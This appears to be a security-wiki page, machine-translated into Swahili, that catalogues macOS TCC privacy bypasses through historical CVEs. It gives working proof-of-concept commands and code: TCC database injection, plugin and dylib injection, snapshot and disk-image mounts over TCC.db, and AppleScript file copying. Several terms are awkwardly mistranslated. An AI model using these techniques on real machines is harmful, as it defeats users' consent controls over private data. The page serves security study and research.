# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## By functionality

### Write Bypass

Hii si njia ya kupita, ni jinsi TCC inavyofanya kazi: **Haipati ulinzi dhidi ya kuandika**. Ikiwa Terminal **haina ufikiaji wa kusoma Desktop ya mtumiaji inaweza bado kuandika ndani yake**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`** inaongezwa kwa **file** mpya ili kutoa **access** kwa **app ya waumbaji** kuisoma.

### TCC ClickJacking

Inawezekana **kweka dirisha juu ya TCC prompt** ili kumfanya mtumiaji **akubali** bila kutambua. Unaweza kupata PoC katika [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Mshambuliaji anaweza **kuunda apps zenye jina lolote** (mfano, Finder, Google Chrome...) katika **`Info.plist`** na kufanya iweze kuomba access kwa eneo fulani lililohifadhiwa na TCC. Mtumiaji atafikiri kwamba application halali ndiyo inayoomba access hii.\
Zaidi ya hayo, inawezekana **kuondoa app halali kutoka kwenye Dock na kuweka ile bandia** juu yake, hivyo wakati mtumiaji anabofya ile bandia (ambayo inaweza kutumia ikoni ile ile) inaweza kuita ile halali, kuomba ruhusa za TCC na kutekeleza malware, ikimfanya mtumiaji aamini kwamba app halali iliiomba access.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Maelezo zaidi na PoC katika:

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Kwa kawaida, access kupitia **SSH ilikuwa na "Full Disk Access"**. Ili kuondoa hii unahitaji kuwa na orodha lakini imezuiliwa (kuiondoa kwenye orodha hakutafuta hizo ruhusa):

![](<../../../../../images/image (1077).png>)

Hapa unaweza kupata mifano ya jinsi baadhi ya **malwares zimeweza kupita ulinzi huu**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Kumbuka kwamba sasa, ili uweze kuwezesha SSH unahitaji **Full Disk Access**

### Handle extensions - CVE-2022-26767

Attribute **`com.apple.macl`** inatolewa kwa files ili kutoa **ruhusa fulani kwa application kuisoma.** Attribute hii inawekwa wakati wa **drag\&drop** file juu ya app, au wakati mtumiaji **anabofya mara mbili** file ili kuifungua na **application ya kawaida**.

Hivyo, mtumiaji anaweza **kujiandikisha app mbaya** kushughulikia extensions zote na kuita Launch Services ili **kuifungua** file yoyote (hivyo file mbaya itapata access ya kuisoma).

### iCloud

Ruhusa **`com.apple.private.icloud-account-access`** inawezesha kuwasiliana na **`com.apple.iCloudHelper`** XPC service ambayo itatoa **iCloud tokens**.

**iMovie** na **Garageband** walikuwa na ruhusa hii na nyingine ambazo ziliruhusu.

Kwa maelezo zaidi kuhusu exploit ya **kupata iCloud tokens** kutoka kwa ruhusa hiyo angalia mazungumzo: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

App yenye ruhusa **`kTCCServiceAppleEvents`** itakuwa na uwezo wa **kontroli Apps nyingine**. Hii inamaanisha kwamba inaweza kuwa na uwezo wa **kuitumia ruhusa zilizotolewa kwa Apps nyingine**.

Kwa maelezo zaidi kuhusu Apple Scripts angalia:

{{#ref}}
macos-apple-scripts.md
{{#endref}}

Kwa mfano, ikiwa App ina **ruhusa ya Automation juu ya `iTerm`**, kwa mfano katika mfano huu **`Terminal`** ina access juu ya iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, ambaye hana FDA, anaweza kuita iTerm, ambayo ina, na kuitumia kufanya vitendo:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Juu ya Finder

Au ikiwa App ina ufikiaji juu ya Finder, inaweza kuwa skripti kama hii:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Kwa Tabia ya Programu

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Daemoni ya **tccd** ya mtumiaji ilikuwa ikitumia **`HOME`** **env** variable kufikia hifadhidata ya watumiaji wa TCC kutoka: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Kulingana na [hii posti ya Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) na kwa sababu daemoni ya TCC inafanya kazi kupitia `launchd` ndani ya eneo la mtumiaji wa sasa, inawezekana **kudhibiti kila variable ya mazingira** inayopitishwa kwake.\
Hivyo, **mshambuliaji anaweza kuweka variable ya mazingira ya `$HOME`** katika **`launchctl`** kuashiria **directory** **iliyodhibitiwa**, **kuanzisha upya** daemoni ya **TCC**, na kisha **kurekebisha moja kwa moja hifadhidata ya TCC** ili kujipa **haki zote za TCC zinazopatikana** bila kumwuliza mtumiaji wa mwisho.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Maelezo

Maelezo yalikuwa na ufikiaji wa maeneo yaliyo na ulinzi wa TCC lakini wakati noti inaundwa hii **inaundwa katika eneo lisilo na ulinzi**. Hivyo, unaweza kuomba maelezo ya nakala faili iliyo na ulinzi katika noti (hivyo katika eneo lisilo na ulinzi) na kisha kufikia faili hiyo:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Usafirishaji

Binary `/usr/libexec/lsd` pamoja na maktaba `libsecurity_translocate` ilikuwa na haki `com.apple.private.nullfs_allow` ambayo iliruhusu kuunda **nullfs** mount na ilikuwa na haki `com.apple.private.tcc.allow` na **`kTCCServiceSystemPolicyAllFiles`** kufikia kila faili.

Ilikuwa inawezekana kuongeza sifa ya karantini kwa "Library", kuita huduma ya XPC **`com.apple.security.translocation`** na kisha ingemape Library kwa **`$TMPDIR/AppTranslocation/d/d/Library`** ambapo nyaraka zote ndani ya Library zinaweza **kufikiwa**.

### CVE-2023-38571 - Muziki & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Muziki`** ina kipengele cha kuvutia: Wakati inafanya kazi, itafanya **kuagiza** faili zilizotupwa kwenye **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** katika "maktaba ya media" ya mtumiaji. Zaidi ya hayo, inaita kitu kama: **`rename(a, b);`** ambapo `a` na `b` ni:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Hii **`rename(a, b);`** tabia ni hatarishi kwa **Race Condition**, kwani inawezekana kuweka ndani ya folda `Automatically Add to Music.localized` faili bandia ya **TCC.db** na kisha wakati folda mpya (b) inaundwa ili kunakili faili, ifutwe, na kuelekezwe kwa **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE_SQLLOG_DIR - CVE-2023-32422

Ikiwa **`SQLITE_SQLLOG_DIR="path/folder"`** maana yake ni kwamba **databasi yoyote iliyo wazi inakopiwa kwenye njia hiyo**. Katika CVE hii udhibiti huu ulitumiwa vibaya ili **kuandika** ndani ya **SQLite database** ambayo itafunguliwa na mchakato wenye FDA wa TCC database, na kisha kutumia **`SQLITE_SQLLOG_DIR`** na **symlink katika jina la faili** hivyo wakati databasi hiyo inafunguliwa, mtumiaji **TCC.db inabadilishwa** na ile iliyo wazi.\
**Maelezo zaidi** [**katika andiko**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **na** [**katika mazungumzo**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Ikiwa variable ya mazingira **`SQLITE_AUTO_TRACE`** imewekwa, maktaba **`libsqlite3.dylib`** itaanza **kurekodi** maswali yote ya SQL. Programu nyingi zilitumie maktaba hii, hivyo ilikuwa inawezekana kurekodi maswali yao yote ya SQLite.

Programu kadhaa za Apple zilitumie maktaba hii kufikia taarifa zilizo na ulinzi wa TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Hii **env variable inatumika na `Metal` framework** ambayo ni utegemezi wa programu mbalimbali, hasa `Music`, ambayo ina FDA.

Kuweka yafuatayo: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Ikiwa `path` ni directory halali, hitilafu itasababisha na tunaweza kutumia `fs_usage` kuona kinachoendelea katika programu:

- faili itafunguliwa `open()` inayoitwa `path/.dat.nosyncXXXX.XXXXXX` (X ni nasibu)
- moja au zaidi ya `write()` zitaandika maudhui kwenye faili (hatudhibiti hii)
- `path/.dat.nosyncXXXX.XXXXXX` itakuwa `renamed()` kuwa `path/name`

Ni uandishi wa faili wa muda, ikifuatia **`rename(old, new)`** **ambayo si salama.**

Si salama kwa sababu inahitaji **kufafanua njia za zamani na mpya tofauti**, ambayo inaweza kuchukua muda na inaweza kuwa hatarini kwa Condition ya Mbio. Kwa maelezo zaidi unaweza kuangalia kazi ya `xnu` `renameat_internal()`.

> [!CAUTION]
> Hivyo, kimsingi, ikiwa mchakato wenye mamlaka unabadilisha jina kutoka folda unayodhibiti, unaweza kupata RCE na kufanya iweze kufikia faili tofauti au, kama katika CVE hii, kufungua faili ambayo programu yenye mamlaka iliumba na kuhifadhi FD.
>
> Ikiwa kubadilisha jina kunafikia folda unayodhibiti, wakati umebadilisha faili ya chanzo au una FD kwake, unabadilisha faili (au folda) ya marudio kuashiria symlink, hivyo unaweza kuandika wakati wowote unavyotaka.

Hii ilikuwa shambulio katika CVE: Kwa mfano, ili kufuta `TCC.db` ya mtumiaji, tunaweza:

- kuunda `/Users/hacker/ourlink` kuashiria `/Users/hacker/Library/Application Support/com.apple.TCC/`
- kuunda directory `/Users/hacker/tmp/`
- kuweka `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- kusababisha hitilafu kwa kuendesha `Music` na hii env var
- kukamata `open()` ya `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X ni nasibu)
- hapa pia tunafungua faili hii kwa ajili ya kuandika, na kushikilia desktopu ya faili
- kubadilisha kwa atomiki `/Users/hacker/tmp` na `/Users/hacker/ourlink` **katika mzunguko**
- tunafanya hivi ili kuongeza nafasi zetu za kufanikiwa kwani dirisha la mbio ni finyu sana, lakini kupoteza mbio kuna hasara ndogo
- subiri kidogo
- jaribu ikiwa tumepata bahati
- ikiwa si, endesha tena kutoka juu

Maelezo zaidi katika [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Sasa, ikiwa unajaribu kutumia env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE` programu hazitazinduka

### Apple Remote Desktop

Kama root unaweza kuwezesha huduma hii na **ARD agent itakuwa na ufikiaji kamili wa diski** ambayo inaweza kutumiwa vibaya na mtumiaji kufanya iweze kunakili **TCC user database** mpya.

## Kwa **NFSHomeDirectory**

TCC inatumia database katika folda ya HOME ya mtumiaji kudhibiti ufikiaji wa rasilimali maalum kwa mtumiaji katika **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Hivyo, ikiwa mtumiaji ataweza kuanzisha tena TCC na env variable ya $HOME ikielekeza kwenye **folda tofauti**, mtumiaji anaweza kuunda database mpya ya TCC katika **/Library/Application Support/com.apple.TCC/TCC.db** na kumdanganya TCC kutoa ruhusa yoyote ya TCC kwa programu yoyote.

> [!TIP]
> Kumbuka kwamba Apple inatumia mipangilio iliyohifadhiwa ndani ya wasifu wa mtumiaji katika **`NFSHomeDirectory`** attribute kwa **thamani ya `$HOME`**, hivyo ikiwa unaharibu programu yenye ruhusa za kubadilisha thamani hii (**`kTCCServiceSystemPolicySysAdminFiles`**), unaweza **kuweka silaha** chaguo hili na bypass ya TCC.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**POC ya kwanza** inatumia [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) na [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kubadilisha **HOME** folder ya mtumiaji.

1. Pata _csreq_ blob kwa programu lengwa.
2. Pandisha faili ya uwongo _TCC.db_ yenye ufikiaji unaohitajika na _csreq_ blob.
3. Exporting entry ya Huduma za Katalogi ya mtumiaji kwa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Badilisha entry ya Huduma za Katalogi kubadilisha folda ya nyumbani ya mtumiaji.
5. Ingiza entry iliyobadilishwa ya Huduma za Katalogi kwa [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Simamisha _tccd_ ya mtumiaji na upya mchakato.

POC ya pili ilitumia **`/usr/libexec/configd`** ambayo ilikuwa na `com.apple.private.tcc.allow` yenye thamani `kTCCServiceSystemPolicySysAdminFiles`.\
Ilikuwa inawezekana kuendesha **`configd`** na chaguo la **`-t`**, mshambuliaji angeweza kubainisha **Bundle maalum ya kupakia**. Hivyo, exploit **inabadilisha** njia ya **`dsexport`** na **`dsimport`** ya kubadilisha folda ya nyumbani ya mtumiaji kwa **`configd` code injection**.

Kwa maelezo zaidi angalia [**ripoti ya asili**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Kwa mchakato wa sindano

Kuna mbinu tofauti za kuingiza msimbo ndani ya mchakato na kutumia ruhusa zake za TCC:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Zaidi ya hayo, sindano ya mchakato ya kawaida zaidi ili kupita TCC iliyoonekana ni kupitia **plugins (load library)**.\
Plugins ni msimbo wa ziada mara nyingi katika mfumo wa maktaba au plist, ambayo itakuwa **inayoandikwa na programu kuu** na itatekelezwa chini ya muktadha wake. Hivyo, ikiwa programu kuu ilikuwa na ufikiaji wa faili zilizozuiliwa na TCC (kupitia ruhusa au haki zilizotolewa), **msimbo maalum pia utakuwa nao**.

### CVE-2020-27937 - Directory Utility

Programu `/System/Library/CoreServices/Applications/Directory Utility.app` ilikuwa na haki **`kTCCServiceSystemPolicySysAdminFiles`**, ilipakia plugins zenye **`.daplug`** upanuzi na **haikuwa na** runtime iliyohardishwa.

Ili kuweka silaha CVE hii, **`NFSHomeDirectory`** inabadilishwa (ikifanya matumizi ya haki ya awali) ili kuwa na uwezo wa **kuchukua database ya TCC ya watumiaji** ili kupita TCC.

Kwa maelezo zaidi angalia [**ripoti ya asili**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** ilikuwa na haki `com.apple.security.cs.disable-library-validation` na `com.apple.private.tcc.manager`. Ya kwanza **ikitoa ruhusa ya sindano ya msimbo** na ya pili ikitoa ufikiaji wa **kusimamia TCC**.

Binary hii iliruhusu kupakia **plugins za upande wa tatu** kutoka folda `/Library/Audio/Plug-Ins/HAL`. Hivyo, ilikuwa inawezekana **kupakia plugin na kutumia ruhusa za TCC** na PoC hii:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Kwa maelezo zaidi angalia [**ripoti ya asili**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Vifaa vya Abstraction Layer (DAL) Plug-Ins

Programu za mfumo ambazo zinafungua mtiririko wa kamera kupitia Core Media I/O (programu zenye **`kTCCServiceCamera`**) zinapakia **katika mchakato wa plugins hizi** zilizoko katika `/Library/CoreMediaIO/Plug-Ins/DAL` (hazijapigwa marufuku na SIP).

Kuhifadhi tu maktaba yenye **mjenzi** wa kawaida kutafanya kazi ku **ingiza msimbo**.

Programu kadhaa za Apple zilikuwa na udhaifu huu.

### Firefox

Programu ya Firefox ilikuwa na haki za `com.apple.security.cs.disable-library-validation` na `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Kwa maelezo zaidi kuhusu jinsi ya kutumia kwa urahisi hii [**angalia ripoti ya asili**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` ilikuwa na ruhusa **`com.apple.private.tcc.allow`** na **`com.apple.security.get-task-allow`**, ambazo ziliruhusu kuingiza msimbo ndani ya mchakato na kutumia ruhusa za TCC.

### CVE-2023-26818 - Telegram

Telegram ilikuwa na ruhusa **`com.apple.security.cs.allow-dyld-environment-variables`** na **`com.apple.security.cs.disable-library-validation`**, hivyo ilikuwa inawezekana kuitumia vibaya ili **kupata ufikiaji wa ruhusa zake** kama kurekodi kwa kutumia kamera. Unaweza [**kupata payload katika andiko**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Kumbuka jinsi ya kutumia variable ya env ili kupakia maktaba **plist maalum** ili kuingiza maktaba hii na **`launchctl`** ilitumika kuanzisha.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Kwa miito ya wazi

Inawezekana kuita **`open`** hata wakati wa sandboxed

### Scripts za Terminal

Ni kawaida sana kutoa **Full Disk Access (FDA)** kwa terminal, angalau katika kompyuta zinazotumiwa na watu wa teknolojia. Na inawezekana kuita scripts za **`.terminal`** kwa kutumia hiyo.

Scripts za **`.terminal`** ni faili za plist kama hii yenye amri ya kutekeleza katika ufunguo wa **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Sifa ya programu inaweza kuandika script ya terminal katika eneo kama /tmp na kuizindua kwa kutumia amri kama:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Kwa kuunganisha

### CVE-2020-9771 - mount_apfs TCC bypass na kupanda kwa mamlaka

**Mtumiaji yeyote** (hata wasio na mamlaka) anaweza kuunda na kuunganisha picha ya mashine ya wakati na **kufikia FAILI ZOTE** za picha hiyo.\
**Mamlaka pekee** inayohitajika ni kwa programu inayotumika (kama `Terminal`) kuwa na **Upatikanaji wa Diski Kamili** (FDA) (`kTCCServiceSystemPolicyAllfiles`) ambayo inahitaji kupewa na admin.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Maelezo ya kina zaidi yanaweza [**kupatikana katika ripoti ya asili**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount juu ya faili ya TCC

Hata kama faili ya TCC DB inalindwa, ilikuwa inawezekana **kuweka juu ya directory** faili mpya ya TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Check the **full exploit** in the [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Kama ilivyoelezwa katika [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), CVE hii ilitumia `diskarbitrationd`.

Kazi ya `DADiskMountWithArgumentsCommon` kutoka kwa mfumo wa `DiskArbitration` wa umma ilifanya ukaguzi wa usalama. Hata hivyo, inawezekana kuipita kwa kuita moja kwa moja `diskarbitrationd` na hivyo kutumia vipengele vya `../` katika njia na symlinks.

Hii iliruhusu mshambuliaji kufanya mounts zisizo na mipaka katika eneo lolote, ikiwa ni pamoja na juu ya database ya TCC kutokana na haki `com.apple.private.security.storage-exempt.heritable` ya `diskarbitrationd`.

### asr

Zana **`/usr/sbin/asr`** iliruhusu kunakili diski nzima na kuimount mahali pengine ikipita ulinzi wa TCC.

### Location Services

Kuna database ya tatu ya TCC katika **`/var/db/locationd/clients.plist`** kuonyesha wateja walio ruhusiwa **kupata huduma za eneo**.\
Folda **`/var/db/locationd/` haikupatiwa ulinzi kutoka kwa DMG mounting** hivyo ilikuwa inawezekana kuimount plist yetu wenyewe.

## By startup apps

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## By grep

Katika matukio kadhaa faili zitahifadhi taarifa nyeti kama barua pepe, nambari za simu, ujumbe... katika maeneo yasiyolindwa (ambayo yanachukuliwa kama udhaifu katika Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Hii haifanyi kazi tena, lakini [**ilifanya zamani**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Njia nyingine kutumia [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
